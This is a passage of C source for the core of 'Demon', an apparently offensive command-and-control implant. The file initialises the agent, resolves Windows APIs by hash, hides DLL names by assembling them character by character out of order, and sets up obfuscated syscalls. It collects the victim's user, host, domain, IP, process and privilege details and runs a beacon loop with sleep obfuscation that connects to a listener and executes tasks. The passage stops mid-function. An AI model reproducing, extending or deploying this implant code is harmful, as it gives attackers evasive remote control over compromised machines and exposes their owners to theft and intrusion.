#include "Demon.h"

/* Import Common Headers */
#include <Common/Defines.h>
#include <Common/Macros.h>

/* Import Core Headers */
#include <Core/Transport.h>
#include <Core/SleepObf.h>
#include <Core/WinUtils.h>
#include <Core/MiniStd.h>

/* Import Inject Headers */
#include <Inject/Inject.h>

/* Import Inject Headers */
#include <Loader/ObjectApi.h>

/* Global Variables */
SEC_DATA INSTANCE Instance      = { 0 };
SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;

/*
 * In DemonMain it should go as followed:
 *
 * 1. Initialize pointer, modules and win32 api
 * 2. Initialize metadata
 * 3. Parse config
 * 4. Enter main connecting and tasking routine
 *
 * */
VOID DemonMain( PVOID ModuleInst )
{
    PUTS( "Start" )

    /* Use passed module agent instance */
    if ( ModuleInst )
        Instance.Session.ModuleBase = ModuleInst;

    /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
    DemonInit();

    /* Initialize MetaData */
    DemonMetaData( &Instance.MetaData, TRUE );

    /* Parse config */
    DemonConfig();

    /* Main demon routine */
    DemonRoutine();
}

/* Main demon routine:
 *
 * 1. Connect to listener
 * 2. Go into tasking routine:
 *      A. Sleep Obfuscation.
 *      B. Request for the task queue
 *      C. Parse Task
 *      D. Execute Task (if it's not DEMON_COMMAND_NO_JOB)
 *      E. Goto C (we do this til there is nothing left)
 *      F. Goto A (we have nothing else to execute then lets sleep and after waking up request for more)
 * 3. Sleep Obfuscation. After that lets try to connect to the listener again
 */
_Noreturn
VOID DemonRoutine()
{
    /* the main loop */
    for ( ;; )
    {
        /* if we aren't connected then lets connect to our host */
        if ( ! Instance.Session.Connected )
        {
            /* Connect to our listener */
            if ( TransportInit() )
            {

#ifdef TRANSPORT_HTTP
                /* reset the failure counter since we managed to connect to it. */
                Instance.Config.Transport.Host->Failures = 0;
#endif

                /* Enter tasking routine */
                CommandDispatcher();
            }
        }

        /* Sleep for a while (with encryption if specified) */
        SleepObf( Instance.Config.Sleeping * 1000 );
    }
}

/* Init metadata buffer/package. */
VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
{
    PVOID            Data       = NULL;
    PIP_ADAPTER_INFO Adapter    = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T           Length     = 0;

    /* Check we if we want to add the Agent Header + CommandID too */
    if ( Header )
    {
        *MetaData = PackageCreate( DEMON_INITIALIZE );

        /* Do not destroy this package if we fail to connect to the listener. */
        ( *MetaData )->Destroy = FALSE;
    }

    // create AES Keys/IV
    if ( Instance.Config.AES.Key == NULL && Instance.Config.AES.IV == NULL )
    {
        Instance.Config.AES.Key = Instance.Win32.LocalAlloc( LPTR, 32 );
        Instance.Config.AES.IV  = Instance.Win32.LocalAlloc( LPTR, 16 );

        for ( SHORT i = 0; i < 32; i++ )
            Instance.Config.AES.Key[ i ] = RandomNumber32();

        for ( SHORT i = 0; i < 16; i++ )
            Instance.Config.AES.IV[ i ]  = RandomNumber32();
    }

    /*

     Header (if specified):
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes

     MetaData:
        [ AES KEY      ] 32 bytes
        [ AES IV       ] 16 bytes
        [ Magic Value  ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ User Name    ] size + bytes
        [ Host Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
        ..... more
        [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
    */

    // Add AES Keys/IV
    PackageAddPad( *MetaData, Instance.Config.AES.Key, 32 );
    PackageAddPad( *MetaData, Instance.Config.AES.IV,  16 );

    // Add session id
    PackageAddInt32( *MetaData, Instance.Session.AgentID );

    // Get Computer name
    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &Length ) )
    {
        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
        {
            MemSet( Data, 0, Length );
            Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &Length );
        }
    }
    PackageAddBytes( *MetaData, Data, Length );
    DATA_FREE( Data, Length );

    // Get Username
    Length = MAX_PATH;
    if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
    {
        MemSet( Data, 0, Length );
        Instance.Win32.GetUserNameA( Data, &Length );
    }

    PackageAddBytes( *MetaData, Data, Length );
    DATA_FREE( Data, Length );

    // Get Domain
    Length = 0;
    if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
    {
        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
        {
            MemSet( Data, 0, Length );
            Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
        }
    }
    PackageAddBytes( *MetaData, Data, Length );
    DATA_FREE( Data, Length );

    Instance.Win32.GetAdaptersInfo( NULL, &Length );
    if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
    {
        if ( Instance.Win32.GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
        {
            PackageAddBytes( *MetaData, Adapter->IpAddressList.IpAddress.String, 16 );

            MemSet( Adapter, 0, Length );
            Instance.Win32.LocalFree( Adapter );
            Adapter = NULL;
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Process Path
    Length = ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Length;
    if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
    {
        Length = WCharStringToCharString(
                Data,
                ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer,
                Length
        );
        PackageAddBytes( *MetaData, Data, Length );
    } else PackageAddInt32( *MetaData, 0 );

    PackageAddInt32( *MetaData, Instance.Teb->ClientId.UniqueProcess );
    PackageAddInt32( *MetaData, Instance.Session.PPID );
    PackageAddInt32( *MetaData, Instance.Session.ProcessArch );
    PackageAddInt32( *MetaData, BeaconIsAdmin( ) );

    MemSet( &OsVersions, 0, sizeof( OsVersions ) );
    OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
    Instance.Win32.RtlGetVersion( &OsVersions );
    PackageAddInt32( *MetaData, OsVersions.dwMajorVersion );
    PackageAddInt32( *MetaData, OsVersions.dwMinorVersion );
    PackageAddInt32( *MetaData, OsVersions.wProductType );
    PackageAddInt32( *MetaData, OsVersions.wServicePackMajor );
    PackageAddInt32( *MetaData, OsVersions.dwBuildNumber );

    PackageAddInt32( *MetaData, Instance.Session.OS_Arch );

    PackageAddInt32( *MetaData, Instance.Config.Sleeping );
}

VOID DemonInit( VOID )
{
    // Variables
    CHAR                         ModuleName[ 20 ] = { 0 };
    OSVERSIONINFOEXW             OSVersionExW     = { 0 };
    SYSTEM_PROCESSOR_INFORMATION SystemInfo       = { 0 };

    MemSet( &Instance, 0, sizeof( INSTANCE ) );

    Instance.Teb = NtCurrentTeb();

#ifdef TRANSPORT_HTTP
    PUTS( "TRANSPORT_HTTP" )
#endif

#ifdef TRANSPORT_SMB
    PUTS( "TRANSPORT_SMB" )
#endif

    Instance.Modules.Kernel32 = LdrModulePeb( HASH_KERNEL32 );
    Instance.Modules.Ntdll    = LdrModulePeb( HASH_NTDLL );

    if ( ( ! Instance.Modules.Kernel32 ) || ( Instance.Modules.Ntdll ) )
    {
        // Ntdll
        Instance.Win32.LdrGetProcedureAddress              = LdrFunctionAddr( Instance.Modules.Ntdll, 0x2e5a99f6 );
        Instance.Win32.LdrLoadDll                          = LdrFunctionAddr( Instance.Modules.Ntdll, 0x307db23  );
        Instance.Win32.RtlAllocateHeap                     = LdrFunctionAddr( Instance.Modules.Ntdll, 0xc0b381da );
        Instance.Win32.RtlReAllocateHeap                   = LdrFunctionAddr( Instance.Modules.Ntdll, 0xc0b381da );
        Instance.Win32.RtlFreeHeap                         = LdrFunctionAddr( Instance.Modules.Ntdll, 0x70ba71d7 );
        Instance.Win32.RtlExitUserThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, 0x8e492b88 );
        Instance.Win32.RtlExitUserProcess                  = LdrFunctionAddr( Instance.Modules.Ntdll, 0x3aa1f0ef );
        Instance.Win32.RtlRandomEx                         = LdrFunctionAddr( Instance.Modules.Ntdll, 0x7c3439f5 );
        Instance.Win32.RtlNtStatusToDosError               = LdrFunctionAddr( Instance.Modules.Ntdll, 0x35abf270 );
        Instance.Win32.RtlGetVersion                       = LdrFunctionAddr( Instance.Modules.Ntdll, 0x3ca3aa1d );
        Instance.Win32.RtlCreateTimerQueue                 = LdrFunctionAddr( Instance.Modules.Ntdll, 0xf78fb211 );
        Instance.Win32.RtlCreateTimer                      = LdrFunctionAddr( Instance.Modules.Ntdll, 0xa5de7c4c );
        Instance.Win32.RtlDeleteTimerQueue                 = LdrFunctionAddr( Instance.Modules.Ntdll, 0x9561fe90 );
        Instance.Win32.RtlCaptureContext                   = LdrFunctionAddr( Instance.Modules.Ntdll, 0x7733eed0 );
        Instance.Win32.RtlAddVectoredExceptionHandler      = LdrFunctionAddr( Instance.Modules.Ntdll, 0x554bafa9 );
        Instance.Win32.RtlRemoveVectoredExceptionHandler   = LdrFunctionAddr( Instance.Modules.Ntdll, 0x880c210e );
        Instance.Win32.NtClose                             = LdrFunctionAddr( Instance.Modules.Ntdll, 0x8b8e133d );
        Instance.Win32.NtCreateEvent                       = LdrFunctionAddr( Instance.Modules.Ntdll, 0xca58747d );
        Instance.Win32.NtSetEvent                          = LdrFunctionAddr( Instance.Modules.Ntdll, 0x4514bd95 );

        // Kernel32
        Instance.Win32.VirtualProtectEx                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0xd812922a );
        Instance.Win32.VirtualProtect                      = LdrFunctionAddr( Instance.Modules.Kernel32, 0x844ff18d );
        Instance.Win32.LocalAlloc                          = LdrFunctionAddr( Instance.Modules.Kernel32, 0x73cebc5b );
        Instance.Win32.LocalReAlloc                        = LdrFunctionAddr( Instance.Modules.Kernel32, 0xabad9db2 );
        Instance.Win32.LocalFree                           = LdrFunctionAddr( Instance.Modules.Kernel32, 0xa66df372 );
        Instance.Win32.CreateRemoteThread                  = LdrFunctionAddr( Instance.Modules.Kernel32, 0xaa30775d );
        Instance.Win32.CreateToolhelp32Snapshot            = LdrFunctionAddr( Instance.Modules.Kernel32, 0x66851295 );
        Instance.Win32.CreatePipe                          = LdrFunctionAddr( Instance.Modules.Kernel32, 0x9a8deee7 );
        Instance.Win32.CreateProcessA                      = LdrFunctionAddr( Instance.Modules.Kernel32, 0xaeb52e19 );
        Instance.Win32.CreateFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, 0xeb96c610 );
        Instance.Win32.GetFullPathNameW                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x3524e9fd );
        Instance.Win32.GetFileSize                         = LdrFunctionAddr( Instance.Modules.Kernel32, 0x7891c520 );
        Instance.Win32.CreateNamedPipeW                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x28fe1c03 );
        Instance.Win32.ConvertFiberToThread                = LdrFunctionAddr( Instance.Modules.Kernel32, 0x1f194e49 );
        Instance.Win32.CreateFiberEx                       = LdrFunctionAddr( Instance.Modules.Kernel32, 0x2bac113e );
        Instance.Win32.ReadFile                            = LdrFunctionAddr( Instance.Modules.Kernel32, 0x71019921 );
        Instance.Win32.VirtualAllocEx                      = LdrFunctionAddr( Instance.Modules.Kernel32, 0xf36e5ab4 );
        Instance.Win32.WaitForSingleObjectEx               = LdrFunctionAddr( Instance.Modules.Kernel32, 0x56bd0197 );
        Instance.Win32.ResumeThread                        = LdrFunctionAddr( Instance.Modules.Kernel32, 0x74162a6e );
        Instance.Win32.OpenThread                          = LdrFunctionAddr( Instance.Modules.Kernel32, 0x806cb78f );
        Instance.Win32.Thread32Next                        = LdrFunctionAddr( Instance.Modules.Kernel32, 0x695209e1 );
        Instance.Win32.Thread32First                       = LdrFunctionAddr( Instance.Modules.Kernel32, 0x93049a4a );
        Instance.Win32.GetComputerNameExA                  = LdrFunctionAddr( Instance.Modules.Kernel32, 0xd252a5f3 );
        Instance.Win32.ExitProcess                         = LdrFunctionAddr( Instance.Modules.Kernel32, 0xb769339e );
        Instance.Win32.GetExitCodeProcess                  = LdrFunctionAddr( Instance.Modules.Kernel32, 0xe21026f9 );
        Instance.Win32.GetExitCodeThread                   = LdrFunctionAddr( Instance.Modules.Kernel32, 0xb263c852 );
        Instance.Win32.TerminateProcess                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x60af076d );
        Instance.Win32.GetTickCount                        = LdrFunctionAddr( Instance.Modules.Kernel32, 0x41ad16b9 );
        Instance.Win32.ReadProcessMemory                   = LdrFunctionAddr( Instance.Modules.Kernel32, 0xb8932459 );
        Instance.Win32.ConvertThreadToFiberEx              = LdrFunctionAddr( Instance.Modules.Kernel32, 0xac22a286 );
        Instance.Win32.SwitchToFiber                       = LdrFunctionAddr( Instance.Modules.Kernel32, 0xc2d09e02 );
        Instance.Win32.DeleteFiber                         = LdrFunctionAddr( Instance.Modules.Kernel32, 0x1cd85cc0 );
        Instance.Win32.GetThreadContext                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0xeba2cfc2 );
        Instance.Win32.SetThreadContext                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x7e20964e );
        Instance.Win32.AllocConsole                        = LdrFunctionAddr( Instance.Modules.Kernel32, 0xcddb7fc3 );
        Instance.Win32.FreeConsole                         = LdrFunctionAddr( Instance.Modules.Kernel32, 0x8afb8c5a );
        Instance.Win32.GetConsoleWindow                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0xe1db2410 );
        Instance.Win32.GetStdHandle                        = LdrFunctionAddr( Instance.Modules.Kernel32, 0xf178843c );
        Instance.Win32.SetStdHandle                        = LdrFunctionAddr( Instance.Modules.Kernel32, 0x3ce0e4c8 );
        Instance.Win32.WaitNamedPipeW                      = LdrFunctionAddr( Instance.Modules.Kernel32, 0x85741c4  );
        Instance.Win32.PeekNamedPipe                       = LdrFunctionAddr( Instance.Modules.Kernel32, 0x94f08b9d );
        Instance.Win32.DisconnectNamedPipe                 = LdrFunctionAddr( Instance.Modules.Kernel32, 0x55668f42 );
        Instance.Win32.WriteFile                           = LdrFunctionAddr( Instance.Modules.Kernel32, 0x663cecb0 );
        Instance.Win32.ConnectNamedPipe                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0xc003c602 );
        Instance.Win32.GetCurrentDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, 0x2ced73f4 );
        Instance.Win32.GetFileAttributesW                  = LdrFunctionAddr( Instance.Modules.Kernel32, 0xcc9c6ce3 );
        Instance.Win32.FindFirstFileW                      = LdrFunctionAddr( Instance.Modules.Kernel32, 0xae2636e5 );
        Instance.Win32.FindNextFileW                       = LdrFunctionAddr( Instance.Modules.Kernel32, 0xf3b43c5c );
        Instance.Win32.FindClose                           = LdrFunctionAddr( Instance.Modules.Kernel32, 0xb4e7451c );
        Instance.Win32.FileTimeToSystemTime                = LdrFunctionAddr( Instance.Modules.Kernel32, 0x1fb7928b );
        Instance.Win32.SystemTimeToTzSpecificLocalTime     = LdrFunctionAddr( Instance.Modules.Kernel32, 0x99a3156a );
        Instance.Win32.RemoveDirectoryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x4192723f );
        Instance.Win32.DeleteFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, 0x1cd8872f );
        Instance.Win32.CreateDirectoryW                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x41fac005 );
        Instance.Win32.CopyFileW                           = LdrFunctionAddr( Instance.Modules.Kernel32, 0xac2253d7 );
        Instance.Win32.InitializeProcThreadAttributeList   = LdrFunctionAddr( Instance.Modules.Kernel32, 0x5ca2ca33 );
        Instance.Win32.UpdateProcThreadAttribute           = LdrFunctionAddr( Instance.Modules.Kernel32, 0x9c91a68  );
        Instance.Win32.SetCurrentDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, 0xbec3a080 );
        Instance.Win32.Wow64DisableWow64FsRedirection      = LdrFunctionAddr( Instance.Modules.Kernel32, 0xd859b1d8 );
        Instance.Win32.Wow64RevertWow64FsRedirection       = LdrFunctionAddr( Instance.Modules.Kernel32, 0x72f47e1c );
        Instance.Win32.GetModuleHandleA                    = LdrFunctionAddr( Instance.Modules.Kernel32, 0x5a153f58 );
    }

    // Check if it's min win xp. no one uses win 95 and below (from Meterpreter)
    Instance.Win32.RtlGetVersion( &OSVersionExW );
    if ( OSVersionExW.dwMajorVersion >= 5 )
    {
        Instance.Session.OSVersion = WIN_VERSION_UNKNOWN;

        if ( OSVersionExW.dwMajorVersion == 5 )
        {
            if ( OSVersionExW.dwMinorVersion == 1 )
                Instance.Session.OSVersion = WIN_VERSION_XP;
        }
        else if ( OSVersionExW.dwMajorVersion == 6 )
        {
            if ( OSVersionExW.dwMinorVersion == 0 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_VISTA : WIN_VERSION_2008;
            else if ( OSVersionExW.dwMinorVersion == 1 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_7 : WIN_VERSION_2008_R2;
            else if ( OSVersionExW.dwMinorVersion == 2 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8 : WIN_VERSION_2012;
            else if ( OSVersionExW.dwMinorVersion == 3 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8_1 : WIN_VERSION_2012_R2;
        }
        else if ( OSVersionExW.dwMajorVersion == 10 )
        {
            if ( OSVersionExW.dwMinorVersion == 0 )
                Instance.Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_10 : WIN_VERSION_2016_X;
        }
    }
    PRINTF( "OSVersion: %d\n", Instance.Session.OSVersion );

#ifdef OBF_SYSCALL
    if ( Instance.Session.OSVersion > WIN_VERSION_10 )
    {
        PUTS( "Obfuscated Syscall" );
        SyscallsInit();

        PSYSCALL_STUB   Syscalls        = Instance.Win32.LocalAlloc( LPTR, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
        HMODULE         pNtdll          = SyscallLdrNtdll();
        DWORD           SyscallCounter  = SyscallsExtract( pNtdll, Syscalls );

        Instance.Syscall.NtOpenProcess                     = SyscallsObf( Syscalls, SyscallCounter, 0x5003c058 );
        Instance.Syscall.NtQueryInformationProcess         = SyscallsObf( Syscalls, SyscallCounter, 0xd034fc62 );
        Instance.Syscall.NtQuerySystemInformation          = SyscallsObf( Syscalls, SyscallCounter, 0xee4f73a8 );
        Instance.Syscall.NtAllocateVirtualMemory           = SyscallsObf( Syscalls, SyscallCounter, 0x6793c34c );
        Instance.Syscall.NtQueueApcThread                  = SyscallsObf( Syscalls, SyscallCounter, 0xd4612238 );
        Instance.Syscall.NtOpenThread                      = SyscallsObf( Syscalls, SyscallCounter, 0xfb8a31d1 );
        Instance.Syscall.NtResumeThread                    = SyscallsObf( Syscalls, SyscallCounter, 0x2c7b3d30 );
        Instance.Syscall.NtSuspendThread                   = SyscallsObf( Syscalls, SyscallCounter, 0x50febd61 );
        Instance.Syscall.NtCreateEvent                     = SyscallsObf( Syscalls, SyscallCounter, 0xca58747d );
        Instance.Syscall.NtDuplicateObject                 = SyscallsObf( Syscalls, SyscallCounter, 0x2388ee19 );
        Instance.Syscall.NtGetContextThread                = SyscallsObf( Syscalls, SyscallCounter, 0x9e0e1a44 );
        Instance.Syscall.NtSetContextThread                = SyscallsObf( Syscalls, SyscallCounter, 0x308be0d0 );
        Instance.Syscall.NtWaitForSingleObject             = SyscallsObf( Syscalls, SyscallCounter, 0x4c6dc63c );
        Instance.Syscall.NtAlertResumeThread               = SyscallsObf( Syscalls, SyscallCounter, 0x482e8408 );
        Instance.Syscall.NtSignalAndWaitForSingleObject    = SyscallsObf( Syscalls, SyscallCounter, 0x7bdd15cd );
        Instance.Syscall.NtTestAlert                       = SyscallsObf( Syscalls, SyscallCounter, 0x7915b7df );
        Instance.Syscall.NtCreateThreadEx                  = SyscallsObf( Syscalls, SyscallCounter, 0xcb0c2130 );
        Instance.Syscall.NtOpenProcessToken                = SyscallsObf( Syscalls, SyscallCounter, 0x7bd07459 );
        Instance.Syscall.NtDuplicateToken                  = SyscallsObf( Syscalls, SyscallCounter, 0x3000ecc3 );
        Instance.Syscall.NtProtectVirtualMemory            = SyscallsObf( Syscalls, SyscallCounter, 0x82962c8  );
        Instance.Syscall.NtTerminateThread                 = SyscallsObf( Syscalls, SyscallCounter, 0xac3c9dc8 );
        Instance.Syscall.NtWriteVirtualMemory              = SyscallsObf( Syscalls, SyscallCounter, 0x95f3a792 );
        Instance.Syscall.NtContinue                        = SyscallsObf( Syscalls, SyscallCounter, 0x780a612c );
        Instance.Syscall.NtReadVirtualMemory               = SyscallsObf( Syscalls, SyscallCounter, 0xc24062e3 );
        Instance.Syscall.NtFreeVirtualMemory               = SyscallsObf( Syscalls, SyscallCounter, 0x471aa7e9 );
        Instance.Syscall.NtQueryVirtualMemory              = SyscallsObf( Syscalls, SyscallCounter, 0xe39d8e5d );
        Instance.Syscall.NtQueryInformationToken           = SyscallsObf( Syscalls, SyscallCounter, 0x2ce5a244 );

        MemSet( Syscalls, 0, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
        Instance.Win32.LocalFree( Syscalls );
        Syscalls = NULL;

        // Restore ntdll from PEB
        Instance.Modules.Ntdll                             = LdrModulePeb( HASH_NTDLL );
        PUTS( "END OF OBFUSCATED" )
    }
    else
#endif
    {
        PUTS( "Using Native functions..." )
        Instance.Syscall.NtOpenProcess                     = LdrFunctionAddr( Instance.Modules.Ntdll, 0x5003c058 );
        Instance.Syscall.NtQueryInformationProcess         = LdrFunctionAddr( Instance.Modules.Ntdll, 0xd034fc62 );
        Instance.Syscall.NtQuerySystemInformation          = LdrFunctionAddr( Instance.Modules.Ntdll, 0xee4f73a8 );
        Instance.Syscall.NtAllocateVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, 0x6793c34c );
        Instance.Syscall.NtQueueApcThread                  = LdrFunctionAddr( Instance.Modules.Ntdll, 0xd4612238 );
        Instance.Syscall.NtOpenThread                      = LdrFunctionAddr( Instance.Modules.Ntdll, 0xfb8a31d1 );
        Instance.Syscall.NtResumeThread                    = LdrFunctionAddr( Instance.Modules.Ntdll, 0x2c7b3d30 );
        Instance.Syscall.NtSuspendThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, 0x50febd61 );
        Instance.Syscall.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, 0xca58747d );
        Instance.Syscall.NtDuplicateObject                 = LdrFunctionAddr( Instance.Modules.Ntdll, 0x2388ee19 );
        Instance.Syscall.NtGetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, 0x9e0e1a44 );
        Instance.Syscall.NtSetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, 0x308be0d0 );
        Instance.Syscall.NtWaitForSingleObject             = LdrFunctionAddr( Instance.Modules.Ntdll, 0x4c6dc63c );
        Instance.Syscall.NtAlertResumeThread               = LdrFunctionAddr( Instance.Modules.Ntdll, 0x482e8408 );
        Instance.Syscall.NtSignalAndWaitForSingleObject    = LdrFunctionAddr( Instance.Modules.Ntdll, 0x7bdd15cd );
        Instance.Syscall.NtTestAlert                       = LdrFunctionAddr( Instance.Modules.Ntdll, 0x7915b7df );
        Instance.Syscall.NtCreateThreadEx                  = LdrFunctionAddr( Instance.Modules.Ntdll, 0xcb0c2130 );
        Instance.Syscall.NtOpenProcessToken                = LdrFunctionAddr( Instance.Modules.Ntdll, 0x7bd07459 );
        Instance.Syscall.NtDuplicateToken                  = LdrFunctionAddr( Instance.Modules.Ntdll, 0x3000ecc3 );
        Instance.Syscall.NtProtectVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, 0x82962c8  );
        Instance.Syscall.NtTerminateThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, 0xac3c9dc8 );
        Instance.Syscall.NtWriteVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, 0x95f3a792 );
        Instance.Syscall.NtContinue                        = LdrFunctionAddr( Instance.Modules.Ntdll, 0x780a612c );
        Instance.Syscall.NtReadVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, 0xc24062e3 );
        Instance.Syscall.NtFreeVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, 0x471aa7e9 );
        Instance.Syscall.NtQueryVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, 0xe39d8e5d );
        Instance.Syscall.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, 0x2ce5a244 );
        Instance.Syscall.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, 0xc91f149b );
    }

    ModuleName[ 0 ] = 'A';
    ModuleName[ 2 ] = 'V';
    ModuleName[ 3 ] = 'A';
    ModuleName[ 1 ] = 'D';
    ModuleName[ 8 ] = 0;
    ModuleName[ 6 ] = '3';
    ModuleName[ 7 ] = '2';
    ModuleName[ 5 ] = 'I';
    ModuleName[ 4 ] = 'P';
    Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'C';
    ModuleName[ 3 ] = 'P';
    ModuleName[ 5 ] = '3';
    ModuleName[ 7 ] = 0;
    ModuleName[ 2 ] = 'Y';
    ModuleName[ 4 ] = 'T';
    ModuleName[ 1 ] = 'R';
    ModuleName[ 6 ] = '2';
    Instance.Modules.Crypt32  = LdrModuleLoad( ModuleName );

    ModuleName[ 1 ] = 'S';
    ModuleName[ 2 ] = 'C';
    ModuleName[ 0 ] = 'M';
    ModuleName[ 7 ] = 0;
    ModuleName[ 3 ] = 'o';
    ModuleName[ 5 ] = 'E';
    ModuleName[ 6 ] = 'E';
    ModuleName[ 4 ] = 'r';
    Instance.Modules.Mscoree  = LdrModuleLoad( ModuleName );

    ModuleName[ 3 ] = 'A';
    ModuleName[ 2 ] = 'e';
    ModuleName[ 0 ] = 'O';
    ModuleName[ 1 ] = 'l';
    ModuleName[ 5 ] = 't';
    ModuleName[ 7 ] = '2';
    ModuleName[ 6 ] = '3';
    ModuleName[ 4 ] = 'u';
    ModuleName[ 8 ] = 0;
    Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName );

    ModuleName[ 1 ] = 's';
    ModuleName[ 0 ] = 'U';
    ModuleName[ 6 ] = 0;
    ModuleName[ 5 ] = '2';
    ModuleName[ 3 ] = 'r';
    ModuleName[ 2 ] = 'e';
    ModuleName[ 4 ] = '3';
    Instance.Modules.User32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'S';
    ModuleName[ 7 ] = 0;
    ModuleName[ 6 ] = '2';
    ModuleName[ 4 ] = 'l';
    ModuleName[ 1 ] = 'h';
    ModuleName[ 5 ] = '3';
    ModuleName[ 3 ] = 'l';
    ModuleName[ 2 ] = 'e';
    Instance.Modules.Shell32   = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'm';
    ModuleName[ 6 ] = 0;
    ModuleName[ 4 ] = 'r';
    ModuleName[ 2 ] = 'v';
    ModuleName[ 3 ] = 'c';
    ModuleName[ 5 ] = 't';
    ModuleName[ 1 ] = 's';
    Instance.Modules.Msvcrt  = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ]  = 'k';
    ModuleName[ 10 ] = 0;
    ModuleName[ 1 ]  = 'e';
    ModuleName[ 2 ]  = 'r';
    ModuleName[ 4 ]  = 'e';
    ModuleName[ 3 ]  = 'n';
    ModuleName[ 6 ]  = 'b';
    ModuleName[ 8 ]  = 's';
    ModuleName[ 9 ]  = 'e';
    ModuleName[ 5 ]  = 'l';
    ModuleName[ 7 ]  = 'a';
    Instance.Modules.KernelBase = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'c';
    ModuleName[ 1 ] = 'r';
    ModuleName[ 2 ] = 'y';
    ModuleName[ 3 ] = 'p';
    ModuleName[ 4 ] = 't';
    ModuleName[ 5 ] = 's';
    ModuleName[ 6 ] = 'p';
    ModuleName[ 7 ] = 0;
    Instance.Modules.CryptSp = LdrModuleLoad( ModuleName );

#ifdef TRANSPORT_HTTP
    ModuleName[ 0 ] = 'w';
    ModuleName[ 2 ] = 'n';
    ModuleName[ 7 ] = 0;
    ModuleName[ 4 ] = 't';
    ModuleName[ 1 ] = 'i';
    ModuleName[ 6 ] = 'p';
    ModuleName[ 3 ] = 'h';
    ModuleName[ 5 ] = 't';
    Instance.Modules.WinHttp = LdrModuleLoad( ModuleName );
#endif

    ModuleName[ 0 ] = 'i';
    ModuleName[ 8 ] = 0;
    ModuleName[ 2 ] = 'h';
    ModuleName[ 6 ] = 'p';
    ModuleName[ 1 ] = 'p';
    ModuleName[ 3 ] = 'l';
    ModuleName[ 5 ] = 'a';
    ModuleName[ 4 ] = 'p';
    ModuleName[ 7 ] = 'i';
    Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName );

    ModuleName[ 4 ] = '2';
    ModuleName[ 5 ] = 0;
    ModuleName[ 2 ] = 'i';
    ModuleName[ 1 ] = 'd';
    ModuleName[ 0 ] = 'g';
    ModuleName[ 3 ] = '3';
